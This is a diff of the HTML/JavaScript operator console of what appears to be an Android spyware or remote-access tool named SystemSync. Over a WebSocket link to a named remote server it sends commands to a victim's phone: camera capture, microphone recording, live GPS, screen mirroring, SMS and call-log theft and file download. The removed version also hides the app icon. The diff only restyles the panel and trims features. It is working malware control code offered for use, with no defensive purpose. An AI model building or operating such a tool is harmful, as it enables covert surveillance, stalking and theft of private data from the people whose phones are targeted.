@@ -1,508 +1,425 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SystemSync GOD Console</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
-    <style>
-        /* ===== GLOBAL ===== */
-        body{
-            margin:0;
-            background:radial-gradient(circle at top,#050505,#000);
-            color:#00f7ff;
-            font-family:Consolas,monospace;
-            display:flex;
-            height:100vh;
-            overflow:hidden;
-        }
+<title>SystemSync ELITE Console</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 
-        /* ===== SIDEBAR ===== */
-        #sidebar{
-            width:300px;
-            background:linear-gradient(180deg,#020202,#000);
-            border-right:1px solid #00f7ff22;
-            padding:20px;
-            box-shadow:0 0 30px #00f7ff11;
-            overflow-y:auto;
-        }
+<style>
 
-        .logo{
-            font-size:20px;
-            letter-spacing:3px;
-            margin-bottom:25px;
-            color:#00f7ff;
-        }
+/* ===== GLOBAL ===== */
 
-        .section{
-            margin-bottom:25px;
-        }
+body{
+margin:0;
+background:#eef2f7;
+font-family:Segoe UI;
+display:flex;
+height:100vh;
+overflow:hidden;
+color:#222;
+}
 
-        .section-title{
-            font-size:11px;
-            letter-spacing:2px;
-            color:#00f7ff88;
-            margin-bottom:10px;
-        }
+/* ===== SIDEBAR ===== */
 
-        /* ===== BUTTONS ===== */
-        button{
-            width:100%;
-            padding:10px;
-            margin:6px 0;
-            background:#000;
-            color:#00f7ff;
-            border:1px solid #00f7ff55;
-            border-radius:6px;
-            cursor:pointer;
-            transition:.25s;
-        }
+#sidebar{
+width:280px;
+background:#ffffff;
+border-right:1px solid #d6dde6;
+padding:20px;
+overflow-y:auto;
+}
 
-        button:hover{
-            background:#00f7ff;
-            color:#000;
-            box-shadow:0 0 12px #00f7ff;
-        }
+.logo{
+font-size:20px;
+font-weight:700;
+margin-bottom:25px;
+color:#2b7cff;
+}
 
-        button.small{
-            width:auto;
-            float:right;
-            margin:0 0 0 5px;
-            padding:4px 8px;
-        }
+.section-title{
+font-size:12px;
+letter-spacing:1px;
+color:#6b7a90;
+margin-top:20px;
+margin-bottom:8px;
+}
 
-        /* ===== MAIN ===== */
-        #main{
-            flex:1;
-            display:flex;
-            flex-direction:column;
-        }
+/* BUTTONS */
 
-        /* HEADER */
-        #header{
-            height:60px;
-            border-bottom:1px solid #00f7ff22;
-            display:flex;
-            align-items:center;
-            justify-content:space-between;
-            padding:0 25px;
-            background:#020202;
-        }
+button{
+width:100%;
+padding:10px;
+margin:6px 0;
+border-radius:8px;
+border:none;
+background:#f1f5fa;
+cursor:pointer;
+transition:.2s;
+font-weight:600;
+}
 
-        .status{
-            padding:5px 14px;
-            border-radius:20px;
-            font-size:12px;
-            border:1px solid #00f7ff55;
-        }
+button:hover{
+background:#2b7cff;
+color:white;
+}
 
-        /* ===== CONTENT ===== */
-        #content{
-            flex:1;
-            display:flex;
-            gap:20px;
-            padding:20px;
-        }
+/* ===== MAIN ===== */
 
-        /* VIDEO PANEL */
-        #video-panel{
-            flex:2;
-            background:#020202;
-            border-radius:12px;
-            border:1px solid #00f7ff33;
-            box-shadow:0 0 40px #00f7ff11 inset;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            min-height:300px;
-        }
+#main{
+flex:1;
+display:flex;
+flex-direction:column;
+}
 
-        video, img{
-            width:100%;
-            height:100%;
-            object-fit:contain;
-            border-radius:12px;
-        }
+#header{
+height:60px;
+background:white;
+border-bottom:1px solid #d6dde6;
+display:flex;
+align-items:center;
+justify-content:space-between;
+padding:0 25px;
+font-weight:600;
+}
 
-        /* DATA PANEL */
-        #data-panel{
-            flex:1;
-            background:#020202;
-            border-radius:12px;
-            border:1px solid #00f7ff33;
-            overflow-y:auto;
-            padding:15px;
-        }
+.status{
+padding:6px 14px;
+border-radius:20px;
+font-size:12px;
+background:#e9eef5;
+}
 
-        /* DATA CARD */
-        .card{
-            background:#000;
-            border-left:3px solid #00f7ff;
-            padding:8px;
-            margin-bottom:8px;
-            font-size:12px;
-            word-break:break-word;
-        }
+.online{color:#1c9b5f;}
+.offline{color:#d64545;}
 
-        .card button{
-            width:auto;
-            float:right;
-            margin-left:5px;
-            padding:2px 6px;
-        }
+/* CONTENT */
 
-        /* MAP */
-        #map{
-            height:300px;
-            border-radius:8px;
-            margin-bottom:15px;
-        }
+#content{
+flex:1;
+display:flex;
+gap:20px;
+padding:20px;
+}
 
-        /* AUDIO PLAYER */
-        audio{
-            width:100%;
-            margin-top:10px;
-        }
-    </style>
+/* VIDEO */
+
+#video-panel{
+flex:2;
+background:white;
+border-radius:12px;
+box-shadow:0 5px 18px rgba(0,0,0,.06);
+display:flex;
+align-items:center;
+justify-content:center;
+}
+
+video,img{
+width:100%;
+height:100%;
+object-fit:contain;
+border-radius:12px;
+}
+
+/* OUTPUT BOX */
+
+#output-panel{
+flex:1.2;
+background:white;
+border-radius:12px;
+padding:15px;
+overflow:auto;
+box-shadow:0 5px 18px rgba(0,0,0,.06);
+}
+
+/* TABLE */
+
+table{
+width:100%;
+border-collapse:collapse;
+font-size:13px;
+}
+
+th,td{
+padding:8px;
+border-bottom:1px solid #e6ecf3;
+text-align:left;
+}
+
+th{
+background:#f6f9fc;
+}
+
+/* FILE LIST */
+
+.file-row{
+display:flex;
+justify-content:space-between;
+padding:8px;
+border-bottom:1px solid #eef2f7;
+cursor:pointer;
+}
+
+.file-row:hover{
+background:#f2f7ff;
+}
+
+/* MAP */
+
+#map{
+height:350px;
+border-radius:10px;
+}
+
+/* PAGINATION */
+
+.pagination{
+display:flex;
+justify-content:center;
+margin-top:10px;
+gap:5px;
+}
+
+.page-btn{
+padding:4px 10px;
+background:#eef3ff;
+border-radius:6px;
+cursor:pointer;
+}
+
+</style>
 </head>
+
 <body>
 
-<!-- SIDEBAR -->
 <div id="sidebar">
-    <div class="logo">SYSTEMSYNC</div>
-    <div class="section">
-        <div class="section-title">SURVEILLANCE</div>
-        <button onclick="startScreen()">🖥 SCREEN MIRROR</button>
-        <button onclick="stopScreen()">⏹ STOP SCREEN</button>
-        <button onclick="send('camFront')">📹 FRONT CAMERA</button>
-        <button onclick="send('camBack')">📹 BACK CAMERA</button>
-        <button onclick="send('getLocation')">📍 LIVE GPS</button>
-        <button onclick="send('startAudio')">🎤 START MIC</button>
-        <button onclick="send('stopAudio')">⏹ STOP MIC</button>
-    </div>
-    <div class="section">
-        <div class="section-title">DATA</div>
-        <button onclick="send('ls root')">📂 FILE MANAGER</button>
-        <button onclick="send('getSMS inbox')">💬 SMS LOGS</button>
-        <button onclick="send('getCallLogs')">📞 CALL LOGS</button>
-    </div>
-    <div class="section">
-        <div class="section-title">CONTROL</div>
-        <button onclick="send('hideApp')">👻 HIDE APP ICON</button>
-        <button onclick="send('showApp')">👀 SHOW APP ICON</button>
-        <button onclick="send('vibrate 1000')">📳 VIBRATE (1s)</button>
-    </div>
+
+<div class="logo">SystemSync ELITE</div>
+
+<div class="section-title">SURVEILLANCE</div>
+<button onclick="startScreen()">Screen Mirror</button>
+<button onclick="stopScreen()">Stop Screen</button>
+<button onclick="send('camFront')">Front Camera</button>
+<button onclick="send('camBack')">Back Camera</button>
+<button onclick="send('startAudio')">Start Mic</button>
+<button onclick="send('stopAudio')">Stop Mic</button>
+
+<div class="section-title">DATA</div>
+<button onclick="send('ls root')">File Manager</button>
+<button onclick="send('getSMS inbox')">SMS Logs</button>
+<button onclick="send('getCallLogs')">Call Logs</button>
+<button onclick="send('getLocation')">GPS</button>
+
 </div>
 
-<!-- MAIN -->
 <div id="main">
-    <div id="header">
-        <div>GOD CONTROL PANEL</div>
-        <div id="status" class="status">CONNECTING...</div>
-    </div>
-    <div id="content">
-        <div id="video-panel">
-            <video id="remoteVideo" autoplay playsinline style="display:none;"></video>
-            <div id="placeholder">No video feed</div>
-        </div>
-        <div id="data-panel">
-            <div id="map"></div>
-            <div id="data"></div>
-            <div id="audio-container"></div>
-        </div>
-    </div>
+
+<div id="header">
+CONTROL PANEL
+<div id="status" class="status offline">OFFLINE</div>
+</div>
+
+<div id="content">
+
+<div id="video-panel">
+No video feed
+</div>
+
+<div id="output-panel">
+Output ready…
+</div>
+
+</div>
 </div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
 <script>
-    // ---------- CONFIGURATION ----------
-    const WS_URL = "wss://mirror-view.onrender.com";  // Your Render WebSocket URL
 
-    // ---------- GLOBAL STATE ----------
-    let ws;
-    let mapInstance = null;
-    let pc = null;                     // WebRTC peer connection
-    let currentVideoStream = null;      // For screen mirror
+const WS_URL="wss://mirror-view.onrender.com";
+let ws;
+let pc;
+let mapInstance;
 
-    // ---------- CONNECTION ----------
-    function connectWebSocket() {
-        ws = new WebSocket(WS_URL);
+function connect(){
+ws=new WebSocket(WS_URL);
 
-        ws.onopen = () => {
-            console.log('WebSocket connected');
-            ws.send("I_AM_WEB");
-            setStatus("ONLINE");
-        };
+ws.onopen=()=>{
+ws.send("I_AM_WEB");
+setStatus("ONLINE");
+};
 
-        ws.onmessage = (event) => {
-            const msg = event.data;
-            console.log('Received:', msg);
+ws.onclose=()=>setStatus("OFFLINE");
 
-            if (msg.startsWith("STATUS:")) {
-                setStatus(msg.substring(7));
-            }
-            else if (msg.startsWith("LOC_DATA:")) {
-                try {
-                    const data = JSON.parse(msg.substring(9));
-                    renderMap(data);
-                } catch (e) {
-                    console.error('Invalid location data', e);
-                }
-            }
-            else if (msg.startsWith("FILE_LIST:")) {
-                try {
-                    const files = JSON.parse(msg.substring(10));
-                    renderFiles(files);
-                } catch (e) {
-                    console.error('Invalid file list', e);
-                }
-            }
-            else if (msg.startsWith("FILE_DATA:")) {
-                // For simplicity, offer download
-                const base64 = msg.substring(10);
-                downloadBase64File(base64, "downloaded_file");
-            }
-            else if (msg.startsWith("SMS_DATA:")) {
-                try {
-                    const smsData = JSON.parse(msg.substring(9));
-                    renderLogs(smsData, "SMS Logs");
-                } catch (e) {
-                    console.error('Invalid SMS data', e);
-                }
-            }
-            else if (msg.startsWith("CALL_DATA:")) {
-                try {
-                    const callData = JSON.parse(msg.substring(10));
-                    renderLogs(callData, "Call Logs");
-                } catch (e) {
-                    console.error('Invalid call logs', e);
-                }
-            }
-            else if (msg.startsWith("CAMERA_IMAGE:")) {
-                const base64 = msg.substring(13);
-                displayImage(base64);
-            }
-            else if (msg.startsWith("AUDIO_RECORDING:")) {
-                const base64 = msg.substring(16);
-                playAudio(base64);
-            }
-            else if (msg.startsWith("AUDIO_STARTED")) {
-                showNotification("Audio recording started");
-            }
-            else if (msg.startsWith("AUDIO_STOPPED")) {
-                showNotification("Audio recording stopped");
-            }
-            else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
-                showNotification("Screen sharing started");
-            }
-            else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
-                stopScreenShare();
-                showNotification("Screen sharing stopped");
-            }
-            else if (msg.startsWith("RTC_OFFER:screen:")) {
-                const sdp = msg.substring(17); // after "RTC_OFFER:screen:"
-                handleOffer(sdp);
-            }
-            else if (msg.startsWith("ICE_CANDIDATE:")) {
-                const candidateStr = msg.substring(14);
-                handleIceCandidate(candidateStr);
-            }
-            else if (msg.startsWith("ERROR:")) {
-                alert("Error: " + msg.substring(6));
-            }
-            else if (msg.startsWith("APP_HIDDEN")) {
-                showNotification("App icon hidden");
-            }
-            else if (msg.startsWith("APP_SHOWN")) {
-                showNotification("App icon shown");
-            }
-            else if (msg.startsWith("VIBRATE_DONE")) {
-                showNotification("Vibration completed");
-            }
-            else {
-                console.log('Unhandled message:', msg);
-            }
-        };
+ws.onmessage=(e)=>{
+const msg=e.data;
 
-        ws.onclose = () => {
-            console.log('WebSocket disconnected');
-            setStatus('OFFLINE');
-            setTimeout(connectWebSocket, 5000);
-        };
+if(msg.startsWith("SMS_DATA:"))
+renderTable(JSON.parse(msg.substring(9)),"SMS");
 
-        ws.onerror = (err) => {
-            console.error('WebSocket error', err);
-        };
-    }
+else if(msg.startsWith("CALL_DATA:"))
+renderTable(JSON.parse(msg.substring(10)),"CALL");
 
-    // ---------- COMMAND SENDING ----------
-    function send(cmd) {
-        if (ws && ws.readyState === WebSocket.OPEN) {
-            ws.send(cmd);
-        } else {
-            alert('Not connected to server');
-        }
-    }
+else if(msg.startsWith("FILE_LIST:"))
+renderFiles(JSON.parse(msg.substring(10)));
 
-    // ---------- STATUS UI ----------
-    function setStatus(text) {
-        const el = document.getElementById('status');
-        el.innerText = text;
-        el.style.borderColor = text === 'ONLINE' ? '#00ff99' : '#ff4444';
-        el.style.color = text === 'ONLINE' ? '#00ff99' : '#ff4444';
-    }
+else if(msg.startsWith("LOC_DATA:"))
+renderMap(JSON.parse(msg.substring(9)));
 
-    // ---------- MAP ----------
-    function renderMap(data) {
-        if (mapInstance) mapInstance.remove();
-        mapInstance = L.map('map').setView([data.lat, data.lon], 18);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-        L.circle([data.lat, data.lon], { radius: data.acc || data.accuracy, color: '#00f7ff' }).addTo(mapInstance);
-    }
+else if(msg.startsWith("CAMERA_IMAGE:"))
+showImage(msg.substring(13));
 
-    // ---------- FILE BROWSER ----------
-    function renderFiles(files) {
-        let html = '<h3>File Manager</h3>';
-        html += files.map(f => `
-            <div class="card">
-                ${f.isDir ? '📁' : '📄'} ${f.name} (${formatBytes(f.size)})
-                <button class="small" onclick="send('${f.isDir ? 'ls ' + f.path : 'dl ' + f.path}')">
-                    ${f.isDir ? 'OPEN' : 'DL'}
-                </button>
-            </div>
-        `).join('');
-        document.getElementById('data').innerHTML = html;
-    }
+else if(msg.startsWith("RTC_OFFER:screen:"))
+handleOffer(msg.substring(17));
+};
+}
 
-    function formatBytes(bytes) {
-        if (bytes === 0) return '0 B';
-        const k = 1024;
-        const sizes = ['B', 'KB', 'MB', 'GB'];
-        const i = Math.floor(Math.log(bytes) / Math.log(k));
-        return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
-    }
+function setStatus(s){
+const el=document.getElementById('status');
+el.innerText=s;
+el.className="status "+(s==="ONLINE"?"online":"offline");
+}
 
-    // ---------- LOGS (SMS/Call) ----------
-    function renderLogs(data, title) {
-        let html = `<h3>${title}</h3>`;
-        html += data.map(item => 
-            `<div class="card">${JSON.stringify(item, null, 2)}</div>`
-        ).join('');
-        document.getElementById('data').innerHTML = html;
-    }
+function send(cmd){
+ws.send(cmd);
+}
 
-    // ---------- CAMERA IMAGE ----------
-    function displayImage(base64Image) {
-        const videoPanel = document.getElementById('video-panel');
-        videoPanel.innerHTML = `<img src="data:image/jpeg;base64,${base64Image}" style="max-width:100%; max-height:100%;">`;
-    }
+/* -------- TABLE ---------- */
 
-    // ---------- AUDIO PLAYBACK ----------
-    function playAudio(base64Audio) {
-        const audioContainer = document.getElementById('audio-container');
-        audioContainer.innerHTML = `
-            <audio controls src="data:audio/3gp;base64,${base64Audio}"></audio>
-            <button onclick="downloadBase64File('${base64Audio}', 'recording.3gp')">Download Audio</button>
-        `;
-    }
+function formatDate(ts){
+const d=new Date(ts);
+return d.toLocaleDateString()+" "+d.toLocaleTimeString();
+}
 
-    // ---------- DOWNLOAD BASE64 FILE ----------
-    function downloadBase64File(base64, filename) {
-        const link = document.createElement('a');
-        link.href = 'data:application/octet-stream;base64,' + base64;
-        link.download = filename;
-        link.click();
-    }
+function formatDuration(sec){
+const m=Math.floor(sec/60);
+const s=sec%60;
+return `${m}:${s.toString().padStart(2,'0')}`;
+}
 
-    // ---------- NOTIFICATION (temporary) ----------
-    function showNotification(text) {
-        const status = document.getElementById('status');
-        const original = status.innerText;
-        status.innerText = text;
-        setTimeout(() => { status.innerText = original; }, 2000);
-    }
+function renderTable(data,type){
 
-    // ---------- WEBRTC SCREEN SHARING ----------
-    async function startScreen() {
-        if (!ws || ws.readyState !== WebSocket.OPEN) {
-            alert('Not connected');
-            return;
-        }
-        // Send command to device to start screen sharing
-        send('START_SCREEN_SHARE');
-        // Prepare video panel
-        document.getElementById('video-panel').innerHTML = '<video id="remoteVideo" autoplay playsinline></video>';
-        showNotification("Waiting for screen stream...");
-    }
+let page=0;
+const perPage=20;
 
-    function stopScreen() {
-        send('STOP_SCREEN_SHARE');
-        stopScreenShare();
-    }
+function draw(){
 
-    function stopScreenShare() {
-        if (pc) {
-            pc.close();
-            pc = null;
-        }
-        document.getElementById('video-panel').innerHTML = '<div id="placeholder">Screen sharing stopped</div>';
-    }
+const slice=data.slice(page*perPage,(page+1)*perPage);
 
-    // WebRTC signaling handlers
-    function handleOffer(sdp) {
-        console.log('Received offer', sdp);
-        // Create peer connection if not exists
-        if (!pc) {
-            pc = new RTCPeerConnection({
-                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-            });
+let html="<table><tr>";
 
-            pc.ontrack = (event) => {
-                console.log('Track received');
-                const video = document.getElementById('remoteVideo');
-                if (video && event.streams && event.streams[0]) {
-                    video.srcObject = event.streams[0];
-                    video.style.display = 'block';
-                }
-            };
+Object.keys(slice[0]).forEach(k=>html+=`<th>${k}</th>`);
+html+="</tr>";
 
-            pc.onicecandidate = (event) => {
-                if (event.candidate) {
-                    ws.send('ICE_CANDIDATE:' + JSON.stringify(event.candidate));
-                }
-            };
+slice.forEach(row=>{
+html+="<tr>";
+Object.entries(row).forEach(([k,v])=>{
 
-            pc.oniceconnectionstatechange = () => {
-                console.log('ICE state:', pc.iceConnectionState);
-            };
-        }
+if(k==="duration") v=formatDuration(v);
+if(k==="date") v=formatDate(v);
 
-        // Set remote description
-        const offer = new RTCSessionDescription({
-            type: 'offer',
-            sdp: sdp
-        });
-        pc.setRemoteDescription(offer).then(() => {
-            return pc.createAnswer();
-        }).then((answer) => {
-            return pc.setLocalDescription(answer);
-        }).then(() => {
-            ws.send('ANSWER:' + pc.localDescription.sdp);
-        }).catch(e => console.error('Error handling offer:', e));
-    }
+html+=`<td>${v}</td>`;
+});
+html+="</tr>";
+});
 
-    function handleIceCandidate(candidateStr) {
-        if (!pc) return;
-        try {
-            const candidate = new RTCIceCandidate(JSON.parse(candidateStr));
-            pc.addIceCandidate(candidate).catch(e => console.error('Error adding ICE candidate:', e));
-        } catch (e) {
-            console.error('Invalid ICE candidate', e);
-        }
-    }
+html+="</table>";
 
-    // ---------- INIT ----------
-    window.onload = () => {
-        connectWebSocket();
-    };
+html+=`<div class='pagination'>
+<button onclick='prev()'>Prev</button>
+<button onclick='next()'>Next</button>
+</div>`;
+
+document.getElementById('output-panel').innerHTML=html;
+}
+
+window.prev=()=>{if(page>0){page--;draw();}};
+window.next=()=>{if((page+1)*perPage<data.length){page++;draw();}};
+
+draw();
+}
+
+/* -------- FILE EXPLORER -------- */
+
+function renderFiles(files){
+
+let html="<h3>File Explorer</h3>";
+
+files.forEach(f=>{
+html+=`
+<div class='file-row'
+onclick="send('${f.isDir?'ls ':'dl '}${f.path}')">
+<div>${f.isDir?'📁':'📄'} ${f.name}</div>
+<div>${(f.size/1024).toFixed(1)} KB</div>
+</div>`;
+});
+
+document.getElementById('output-panel').innerHTML=html;
+}
+
+/* -------- MAP -------- */
+
+function renderMap(d){
+
+document.getElementById('output-panel').innerHTML="<div id='map'></div>";
+
+if(mapInstance) mapInstance.remove();
+
+mapInstance=L.map('map').setView([d.lat,d.lon],17);
+
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
+.addTo(mapInstance);
+
+L.marker([d.lat,d.lon]).addTo(mapInstance);
+}
+
+/* -------- IMAGE -------- */
+
+function showImage(base64){
+document.getElementById('video-panel').innerHTML=
+`<img src="data:image/jpeg;base64,${base64}">`;
+}
+
+/* -------- WEBRTC -------- */
+
+async function startScreen(){
+send("START_SCREEN_SHARE");
+}
+
+function stopScreen(){
+send("STOP_SCREEN_SHARE");
+if(pc){pc.close();pc=null;}
+}
+
+function handleOffer(sdp){
+
+if(!pc){
+pc=new RTCPeerConnection({
+iceServers:[{urls:'stun:stun.l.google.com:19302'}]
+});
+
+pc.ontrack=e=>{
+document.getElementById('video-panel').innerHTML=
+"<video autoplay playsinline></video>";
+
+document.querySelector("video").srcObject=e.streams[0];
+};
+
+pc.onicecandidate=e=>{
+if(e.candidate){
+ws.send('ICE_CANDIDATE:'+JSON.stringify(e.candidate));
+}
+};
+}
+
+pc.setRemoteDescription(
+new RTCSessionDescription({type:'offer',sdp})
+)
+.then(()=>pc.createAnswer())
+.then(a=>pc.setLocalDescription(a))
+.then(()=>ws.send('ANSWER:'+pc.localDescription.sdp));
+}
+
+connect();
+
 </script>
 </body>
 </html>
